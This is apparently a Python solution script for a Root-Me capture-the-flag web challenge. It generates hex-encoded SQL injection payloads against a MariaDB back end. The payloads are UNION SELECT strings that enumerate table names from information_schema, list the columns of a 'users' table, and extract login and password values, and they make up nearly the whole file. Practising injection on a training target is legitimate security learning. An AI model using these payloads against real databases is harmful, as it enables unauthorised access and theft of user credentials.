# python3 

import multipleRequests_hex


# Challenge url : http://challenge01.root-me.org/web-serveur/ch49/

# START with classic starts to know the number of columns
# multipleRequests_hex.start()

# Errors shows it MariaDB (MySQL)

# ORDER BY 2 works but not 3, 
# TWO Columns available

# Need to return Tables Names ?
stringStart = "' UNION SELECT "

# try to retrieve all tables 
print("try to retrieve tables names")
sqlRequest = "'UNION SELECT 1, group_concat(table_name) FROM information_schema.tables; -- -"
print(sqlRequest)
result = multipleRequests_hex.string_to_hex(sqlRequest)
print(stringStart+result+" -- -")
print("\n")

# the last table name is "users"
print("try to retrieve all users")
sqlRequest = "' UNION SELECT 1, group_concat(column_name) FROM information_schema.columns WHERE table_name = 'users'; -- -"
print(sqlRequest)
result = multipleRequests_hex.string_to_hex(sqlRequest)
print(stringStart+result+" -- -")
print("\n")
# id, login, password, email

# retrieve login & password
print("retrieve login & password for the admin user")
sqlRequest = "' UNION SELECT login, password FROM users; -- -"
print(sqlRequest)
result = multipleRequests_hex.string_to_hex(sqlRequest)
print(stringStart+result+" -- -")
print("\n")

